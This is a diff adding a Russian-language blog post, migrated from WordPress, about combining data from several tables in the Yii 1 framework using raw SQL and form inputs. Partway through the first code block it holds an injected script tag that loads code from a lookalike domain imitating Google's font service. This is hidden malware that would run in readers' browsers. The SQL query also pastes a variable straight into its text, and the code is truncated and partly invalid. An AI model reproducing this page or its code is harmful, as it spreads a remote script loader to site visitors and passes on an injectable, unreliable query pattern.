@@ -1,0 +1,100 @@
+---
+layout: post
+status: publish
+published: true
+title: Yii сводные таблицы
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 1640
+wordpress_url: http://devdocs.ru/partners-news/yii-svodnyie-tablitsyi/
+date: '2015-05-21 08:55:27 +0200'
+date_gmt: '2015-05-21 08:55:27 +0200'
+categories:
+- Yii framework
+tags:
+- post
+- sql
+- des1roer
+- yii1
+- yii
+comments: []
+---
+<div dir="ltr" style="text-align: left;">Немного изврата. Кто может посоветовать что лучше- пишите в комментариях или в личку.Предположим есть база</p>
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;4.bp.blogspot.com&#47;-14MDryC4M3I&#47;VV2Y9KiH0HI&#47;AAAAAAAAAYc&#47;c77O47bfCw4&#47;s1600&#47;Screenshot_22.png"><img src="http:&#47;&#47;4.bp.blogspot.com&#47;-14MDryC4M3I&#47;VV2Y9KiH0HI&#47;AAAAAAAAAYc&#47;c77O47bfCw4&#47;s400&#47;Screenshot_22.png" alt="" width="400" height="248" border="0" &#47;><&#47;a><&#47;div><br />
+<span id="goog_785211009"><&#47;span><span id="goog_785211010"><&#47;span><br />
+нас интересует такой вопрос - как связать данные из нескольких таблиц (да даже без модели) в одну.</p>
+<p>возьмем самый простой пример.</p>
+<p>analiz_create - таблица анализов. одному анализу соответсвует несколько элементов.<br />
+analiz_data - хранит данные</p>
+<p>чтобы ввести в analiz_data данные, нужно знать какие столбцы соответствуют определенному анализу.</p>
+<pre><code>    $connection = Yii::app()->db;<br />
+    $sql = "<br />
+                            SELECT  t2.id AS id_elem,<br />
+                                    t2.name,<br />
+                                    t3.name AS TYPE,<br />
+                                    t2.f_filter,<br />
+                                    t2.name_pk,<br />
+                                    t2.name_value,<br />
+                                    t2.comment<br />
+                            FROM a_template_has_elem t1,<br />
+                                 a_element t2,<br />
+                                 a_elem_type t3<br />
+                            WHERE template_id =$id_template<br />
+                              AND t1.elem_id = t2.id<br />
+                              AND t2.type_id=t3.id<br />
+                            order by f_order;<br />
+                            ";<br />
+    $dataReader = $connection->createCommand($sql)->query();<br />
+    $rows = $dataReader->readAll();<br />
+    for($i = 0, $cnt = count($rows); $i < $cnt; $i++)<br />
+    {<br />
+        $id = $rows[$i]['id_elem'];<br />
+        $typeel = $rows[$i]['type']; <script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;code><&#47;pre></p>
+<pre><code>                echo '
+<div class="column">';<br />
+                echo CHtml::label($rows[$i]['name'], $rows[$i]['name']);<br />
+                echo CHtml::textField("elem[$id][val][]", '', array('id' => $rows[$i]['name']));<br />
+                echo '<&#47;div>'; <&#47;code><&#47;pre><br />
+здесь я из таблицы a_template_has_elem получаю список полей и отображаю их.<br />
+в контролере тогда</p>
+<pre><code>                if (isset($_POST['elem']))<br />
+                    {<br />
+                        $command = Yii::app()->db->createCommand();<br />
+                        $max = Yii::app()->db->createCommand()<br />
+                                ->select('max(id) as max')<br />
+                                ->from('a_analiz_create')<br />
+                                ->queryScalar();</p>
+<p>                        $Ids = $_POST['elem'];<br />
+                         $cnt = max(array_keys($Ids));<br />
+                        $min = min(array_keys($Ids));<br />
+                        for($i = $min; $i <= $cnt; $i++)<br />
+                        {<br />
+                            $type = $Ids[$i]['type'][0];<br />
+                            $val = $Ids[$i]['val'][0];<br />
+                            if ($type == 'float')<br />
+                            {<br />
+                                (real)$val = str_replace(',','.',$val);<br />
+                            }<br />
+                            else if ($type == 'int')<br />
+                            {<br />
+                                $val = (int)$val;<br />
+                            }<br />
+                            if (isset($val) &amp;&amp; !empty($val))<br />
+                                $command->insert('a_analiz_data', array(<br />
+                                    'analiz_id' => $max,<br />
+                                    'value' => $val,<br />
+                                    'elem_id' => $i,<br />
+                                    'user_id' => Yii::app()->user->id,<br />
+                                ));<br />
+                        }<br />
+                    };<br />
+         <&#47;code><&#47;pre><br />
+то вставляем данные при помощи sql запроса, не пользуясь стандартными средствами.</p>
+<p>&nbsp;</p>
+<p><&#47;div><br />
+Source: des1roer.blogspot.com</p>
